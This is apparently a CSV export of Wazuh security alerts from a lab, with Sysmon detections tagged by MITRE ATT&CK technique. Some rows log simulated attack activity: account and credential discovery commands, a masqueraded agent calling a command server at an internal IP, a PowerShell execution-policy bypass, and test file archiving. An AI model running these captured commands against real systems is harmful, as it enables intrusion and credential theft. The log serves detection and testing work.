wazuh-alerts-4.x-2024.12.22,l0qY7ZMBNimV4ECv0YBb,1,1,192.168.117.129,agent1,4,Maryam, , , , , , , , , , , , , , , , , , , ,2,FALSE,3,Wazuh agent started.,"[""ossec""]",503,ossec,log,"Dec 22, 2024 @ 09:00:31.690",wazuh-agent,1734858032,"Dec 22, 2024 @ 09:00:31.690", , , , , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6.1"",""10.2.6""]","[""CC7.2"",""CC7.3"",""CC6.8""]","[""AU.6"",""AU.14"",""AU.5""]","[""IV_35.7.d""]", , , ,"[""10.1""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,ossec: Agent started: 'agent1->any'., , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,agent1->any,ossec, , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,mUqY7ZMBNimV4ECv0YBb,1,1,192.168.117.129,agent1,4,Maryam, , ,1003,Windows Search Service,0x80000000000000,{CA4E628D-8567-4896-AB6B-835B221F373F},4,Application,0,"""The Windows Search Service started.
""",0,2024-12-22T09:00:32.2657404Z,3664,0,DESKTOP-B37GATP,1,0,INFORMATION,Microsoft-Windows-Search,1,FALSE,3,The Windows search service started.,"[""windows"",""windows_application""]",60668,windows_eventchannel,log,"Dec 22, 2024 @ 09:00:32.546",EventChannel,1734858033,"Dec 22, 2024 @ 09:00:32.546", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,rUqZ7ZMBNimV4ECvA4DG,1,1,192.168.117.129,agent1,4,Maryam,"hr=0x8007139F, RuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c;NotificationInterval=1440;Trigger=NetworkAvailable", ,8198,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},2,Application,0,"""License Activation (slui.exe) failed with the following error code:
hr=0x8007139F
Command-line arguments:
RuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c;NotificationInterval=1440;Trigger=NetworkAvailable""",0,2024-12-22T09:00:44.5937494Z,3676,0,DESKTOP-B37GATP,0,0,ERROR,Microsoft-Windows-Security-SPP,1,FALSE,5,License activation (slui.exe) failed.,"[""windows"",""windows_application""]",60646,windows_eventchannel,log,"Dec 22, 2024 @ 09:00:44.860",EventChannel,1734858045,"Dec 22, 2024 @ 09:00:44.860", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,rkqZ7ZMBNimV4ECvA4DG,1,1,192.168.117.129,agent1,4,Maryam,"hr=0x8007139F, RuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c;NotificationInterval=1440;Trigger=TimerEvent", ,8198,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},2,Application,0,"""License Activation (slui.exe) failed with the following error code:
hr=0x8007139F
Command-line arguments:
RuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=4de7cb65-cdf1-4de9-8ae8-e3cce27b9f2c;NotificationInterval=1440;Trigger=TimerEvent""",0,2024-12-22T09:00:44.7034522Z,3678,0,DESKTOP-B37GATP,0,0,ERROR,Microsoft-Windows-Security-SPP,2,FALSE,5,License activation (slui.exe) failed.,"[""windows"",""windows_application""]",60646,windows_eventchannel,log,"Dec 22, 2024 @ 09:00:44.997",EventChannel,1734858045,"Dec 22, 2024 @ 09:00:44.997", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,4kqa7ZMBNimV4ECvGYA3,1,1,192.168.117.129,agent1,4,Maryam,"2024-12-23T08:59:54Z, RulesEngine", ,16384,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-23T08:59:54Z. Reason: RulesEngine.""",0,2024-12-22T09:01:54.7815601Z,3679,0,DESKTOP-B37GATP,0,0,INFORMATION,Microsoft-Windows-Security-SPP,1,FALSE,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642,windows_eventchannel,log,"Dec 22, 2024 @ 09:01:55.028",EventChannel,1734858115,"Dec 22, 2024 @ 09:01:55.028", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,hUqN7ZMBNimV4ECv3oCp,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,7,Host-based anomaly detection event (rootcheck).,"[""ossec"",""rootcheck""]",510,rootcheck,log,"Dec 22, 2024 @ 08:45:24.077",rootcheck,1734857124,"Dec 22, 2024 @ 08:45:24.077", , , , , , , , , , , , , , , , , , , , , , , ,"[""10.6.1""]", , ,"[""IV_35.7.d""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Trojaned version of file '/bin/diff' detected. Signature used: 'bash|^/bin/sh|file\.h|proc\.h|/dev/[^n]|^/bin/.*sh' (Generic)., , , , , , , , , , , , , , ,/bin/diff,Trojaned version of file detected., , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,iUqN7ZMBNimV4ECv34BP,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,3,Wazuh server started.,"[""ossec""]",502,ossec,log,"Dec 22, 2024 @ 08:45:36.834",wazuh-monitord,1734857136,"Dec 22, 2024 @ 08:45:36.834", , , , , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6.1""]","[""CC7.2"",""CC7.3""]","[""AU.6""]","[""IV_35.7.d""]", , , ,"[""10.1""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,ossec: Manager started., , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,Rkqe7ZMBNimV4ECv5IED,1,1,192.168.117.139,window-agent3,3,Maryam, , ,1, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-22 09:07:06.881
ProcessGuid: {15959494-d6ba-6767-d301-000000001100}
ProcessId: 11404
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  localgroup
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-d5b9-6767-ea38-2b0000000000}
LogonId: 0x2B38EA
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {15959494-d6ba-6767-cd01-000000001100}
ParentProcessId: 11548
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net user && dir c:\Users\ && cmdkey.exe /list && net localgroup ""Users"" && net localgroup
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-22T09:07:06.8833007Z,223462,4236,DESKTOP-QGB4EQH,1,2876,INFORMATION,Microsoft-Windows-Sysmon,3,FALSE,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036,windows_eventchannel,log,"Dec 22, 2024 @ 09:07:06.892",EventChannel,1734858427,"Dec 22, 2024 @ 09:07:06.892", , , , , , , , , ,{15959494-d5b9-6767-ea38-2b0000000000}, , , , ,11404, , , , , , , , , , , , ,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", ,C:\\Windows\\System32\\net.exe, ,{15959494-d6ba-6767-d301-000000001100},07:06.9, , ,DESKTOP-QGB4EQH\\mari,net.exe,Microsoft® Windows® Operating System,{15959494-d6ba-6767-cd01-000000001100},Net Command,"cmd.exe /C net user &amp;&amp; dir c:\\Users\\ &amp;&amp; cmdkey.exe /list &amp;&amp; net localgroup \""Users\"" &amp;&amp; net localgroup",0x2b38ea,11548,C:\\Users\\mari\\,"SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07",C:\\Windows\\System32\\cmd.exe,"technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,net  localgroup,Medium,10.0.19041.1 (WinBuild.160101.0800),1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,SUqe7ZMBNimV4ECv5IED,1,1, ,window-agent3,3,Maryam, , ,2, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File creation time changed:
RuleName: technique_id=T1099,technique_name=Timestomp
UtcTime: 2024-12-22 09:07:10.278
ProcessGuid: {15959494-d51e-6767-2000-000000001100}
ProcessId: 1680
Image: C:\WINDOWS\system32\taskhostw.exe
TargetFilename: C:\Windows.old\Windows\SoftwareDistribution\Download\7588f06b0017936893382a55fe90af5c\amd64_Microsoft-Windows-EditionPack-Professional-Package~~amd64~~10.0.19041.1\msil_smsvchost_b03f5f7f11d50a3a_10.0.19041.1_none_d342644de571beb4\smsvchost.exe
CreationUtcTime: 2024-12-01 07:39:27.125
PreviousCreationUtcTime: 2024-12-01 07:39:27.125
User: NT AUTHORITY\SYSTEM""",5,2024-12-22T09:07:10.2921357Z,223483,4236,DESKTOP-QGB4EQH,2,2876,INFORMATION,Microsoft-Windows-Sysmon, ,FALSE,4, ,"[""stats""]",11,windows_eventchannel,log,"Dec 22, 2024 @ 09:07:10.435",EventChannel,1734858431,"Dec 22, 2024 @ 09:07:10.435", , , , , , , , , , , , , , ,1680, , , , , , , , , , , , , , , , ,C:\\WINDOWS\\system32\\taskhostw.exe, ,{15959494-d51e-6767-2000-000000001100},07:10.3, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , ,"technique_id=T1099,technique_name=Timestomp", , , , , , , , , , , , , , , , , , , , , , , , , , , ,The average number of logs between 12:00 and 13:00 is 1991. We reached 4979., ,C:\\Windows.old\\Windows\\SoftwareDistribution\\Download\\7588f06b0017936893382a55fe90af5c\\amd64_Microsoft-Windows-EditionPack-Professional-Package~~amd64~~10.0.19041.1\\msil_smsvchost_b03f5f7f11d50a3a_10.0.19041.1_none_d342644de571beb4\\smsvchost.exe,39:27.1, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,39:27.1, , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,Skqe7ZMBNimV4ECv74G4,1,1,192.168.117.139,window-agent3,3,Maryam, , ,11, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-22 09:07:14.137
ProcessGuid: {15959494-d6c1-6767-d501-000000001100}
ProcessId: 11412
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_yr1vigo1.nl4.ps1
CreationUtcTime: 2024-12-22 09:07:14.121
User: DESKTOP-QGB4EQH\mari""",2,2024-12-22T09:07:14.1399388Z,223523,4236,DESKTOP-QGB4EQH,11,2876,INFORMATION,Microsoft-Windows-Sysmon,10,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 22, 2024 @ 09:07:14.122",EventChannel,1734858435,"Dec 22, 2024 @ 09:07:14.122", , , , , , , , , , , , , , ,11412, , , , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, ,{15959494-d6c1-6767-d501-000000001100},07:14.1, , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , ,"technique_id=T1059.001,technique_name=PowerShell", , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_yr1vigo1.nl4.ps1,07:14.1, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,Vkqh7ZMBNimV4ECvCoHY,1,1,192.168.117.139,window-agent3,3,Maryam, , ,1, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-12-22 09:09:26.771
ProcessGuid: {15959494-d746-6767-3302-000000001100}
ProcessId: 12104
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C if not exist ""%%ProgramFiles%%\7-zip\7z.exe""  ( call ) ELSE ( echo Downloading 7-zip installer && bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.7-zip.org/a/7z2301-x64.exe"" %%TEMP%%\7zip.exe && %%TEMP%%\7zip.exe /S ) &&   &&  mkdir $PathToAtomicsFolder\T1560.001\victim-files && cd $PathToAtomicsFolder\T1560.001\victim-files && echo ""This file will be encrypted"" > .\encrypted_file.txt && ""%%ProgramFiles%%\7-zip\7z.exe"" u archive.7z *txt -pblue && dir
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-d5b9-6767-ea38-2b0000000000}
LogonId: 0x2B38EA
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-d650-6767-a301-000000001100}
ParentProcessId: 9000
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-22T09:09:27.7142670Z,223701,4236,DESKTOP-QGB4EQH,1,2876,INFORMATION,Microsoft-Windows-Sysmon,5,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 22, 2024 @ 09:09:28.140",EventChannel,1734858569,"Dec 22, 2024 @ 09:09:28.140", , , , , , , , , ,{15959494-d5b9-6767-ea38-2b0000000000}, , , , ,12104, , , , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", ,C:\\Windows\\System32\\cmd.exe, ,{15959494-d746-6767-3302-000000001100},09:26.8, , ,DESKTOP-QGB4EQH\\mari,Cmd.Exe,Microsoft® Windows® Operating System,{15959494-d650-6767-a301-000000001100},Windows Command Processor,"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x2b38ea,9000,C:\\Users\\mari\\,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18",C:\\Users\\Public\\splunkd.exe,"technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,"cmd.exe /C if not exist \""%%ProgramFiles%%\\7-zip\\7z.exe\""  ( call ) ELSE ( echo Downloading 7-zip installer &amp;&amp; bitsadmin /transfer myDownloadJob /download /priority normal \""https://www.7-zip.org/a/7z2301-x64.exe\"" %%TEMP%%\\7zip.exe &amp;&amp; %%TEMP%%\\7zip.exe /S ) &amp;&amp;   &amp;&amp;  mkdir $PathToAtomicsFolder\\T1560.001\\victim-files &amp;&amp; cd $PathToAtomicsFolder\\T1560.001\\victim-files &amp;&amp; echo \""This file will be encrypted\"" &gt; .\\encrypted_file.txt &amp;&amp; \""%%ProgramFiles%%\\7-zip\\7z.exe\"" u archive.7z *txt -pblue &amp;&amp; dir",Medium,10.0.19041.4355 (WinBuild.160101.0800),1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,VEqg7ZMBNimV4ECvqYE0,1,1,192.168.117.139,window-agent3,3,Maryam, , ,1, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution
UtcTime: 2024-12-22 09:09:01.655
ProcessGuid: {15959494-d72d-6767-3102-000000001100}
ProcessId: 17068
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C
Description: Visual C# Command Line Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: csc.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\mari\AppData\Local\Temp\wwiskled.cmdline""
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-d5b9-6767-ea38-2b0000000000}
LogonId: 0x2B38EA
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=B9B34E794E751A7A7F2FF32F56F63C463642E09A,MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259
ParentProcessGuid: {15959494-d701-6767-0c02-000000001100}
ParentProcessId: 14356
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-22T09:09:02.6744642Z,223692,4236,DESKTOP-QGB4EQH,1,2876,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,6,"Powershell script compiling code using CSC.exe, possible malware drop","[""sysmon"",""sysmon_eid1_detections"",""windows""]",92006,windows_eventchannel,log,"Dec 22, 2024 @ 09:09:03.793",EventChannel,1734858544,"Dec 22, 2024 @ 09:09:03.793", , , , , , , , , ,{15959494-d5b9-6767-ea38-2b0000000000}, , , , ,17068, , , , , , , , , , , , ,"[""Compile After Delivery""]","[""T1027.004""]","[""Defense Evasion""]", ,C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe, ,{15959494-d72d-6767-3102-000000001100},09:01.7, , ,DESKTOP-QGB4EQH\\mari,csc.exe,Microsoft® .NET Framework,{15959494-d701-6767-0c02-000000001100},Visual C# Command Line Compiler,"powershell.exe -ExecutionPolicy Bypass -C \""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop\""",0x2b38ea,14356,C:\\Users\\mari\\,"SHA1=B9B34E794E751A7A7F2FF32F56F63C463642E09A,MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution",Microsoft Corporation,"\""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths @\""C:\\Users\\mari\\AppData\\Local\\Temp\\wwiskled.cmdline\""",Medium,4.8.9232.0 built by: NET481REL1LAST_C,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,Tkqf7ZMBNimV4ECvMoEf,1,1,192.168.117.139,window-agent3,3,Maryam, , ,7, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-22 09:07:30.626
ProcessGuid: {15959494-d6b3-6767-cc01-000000001100}
ProcessId: 11332
Image: C:\Windows\System32\sppsvc.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\NETWORK SERVICE""",3,2024-12-22T09:07:30.7255889Z,223593,4248,DESKTOP-QGB4EQH,7,2876,INFORMATION,Microsoft-Windows-Sysmon,26,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 22, 2024 @ 09:07:31.319",EventChannel,1734858452,"Dec 22, 2024 @ 09:07:31.319", , , , , , , , , , , , , , ,11332, , , , , , , , , , , , ,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", ,C:\\Windows\\System32\\sppsvc.exe, ,{15959494-d6b3-6767-cc01-000000001100},07:30.6, , ,NT AUTHORITY\\NETWORK SERVICE,taskschd.dll,Microsoft® Windows® Operating System, ,Task Scheduler COM API, , , , ,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B", ,"technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation, , ,10.0.19041.3636 (WinBuild.160101.0800), , , ,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,TRUE,Valid, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,L0qc7ZMBNimV4ECv1IGc,1,1,192.168.117.139,window-agent3,3,Maryam, , ,11, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-12-22 09:04:55.942
ProcessGuid: {15959494-d637-6767-9101-000000001100}
ProcessId: 564
Image: C:\Users\mari\AppData\Local\Microsoft\EdgeUpdate\Install\{8C1B3A56-0DB8-4B31-82B2-B1C3CFC25F05}\MicrosoftEdgeUpdateSetup_X86_1.3.195.43.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\EU8941.tmp\MicrosoftEdgeUpdateComRegisterShell64.exe
CreationUtcTime: 2024-12-22 09:04:55.942
User: DESKTOP-QGB4EQH\mari""",2,2024-12-22T09:04:55.9523581Z,222023,4236,DESKTOP-QGB4EQH,11,2876,INFORMATION,Microsoft-Windows-Sysmon,5,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:56.068",EventChannel,1734858297,"Dec 22, 2024 @ 09:04:56.068", , , , , , , , , , , , , , ,564, , , , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{8C1B3A56-0DB8-4B31-82B2-B1C3CFC25F05}\\MicrosoftEdgeUpdateSetup_X86_1.3.195.43.exe, ,{15959494-d637-6767-9101-000000001100},04:55.9, , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\EU8941.tmp\\MicrosoftEdgeUpdateComRegisterShell64.exe,04:55.9, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,MUqc7ZMBNimV4ECv1IGc,1,1,192.168.117.139,window-agent3,3,Maryam, , ,11, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-12-22 09:04:56.052
ProcessGuid: {15959494-d637-6767-9101-000000001100}
ProcessId: 564
Image: C:\Users\mari\AppData\Local\Microsoft\EdgeUpdate\Install\{8C1B3A56-0DB8-4B31-82B2-B1C3CFC25F05}\MicrosoftEdgeUpdateSetup_X86_1.3.195.43.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\EU8941.tmp\MicrosoftEdgeUpdateCore.exe
CreationUtcTime: 2024-12-22 09:04:56.052
User: DESKTOP-QGB4EQH\mari""",2,2024-12-22T09:04:56.0594489Z,222036,4236,DESKTOP-QGB4EQH,11,2876,INFORMATION,Microsoft-Windows-Sysmon,7,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:56.271",EventChannel,1734858297,"Dec 22, 2024 @ 09:04:56.271", , , , , , , , , , , , , , ,564, , , , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{8C1B3A56-0DB8-4B31-82B2-B1C3CFC25F05}\\MicrosoftEdgeUpdateSetup_X86_1.3.195.43.exe, ,{15959494-d637-6767-9101-000000001100},04:56.1, , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\EU8941.tmp\\MicrosoftEdgeUpdateCore.exe,04:56.1, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
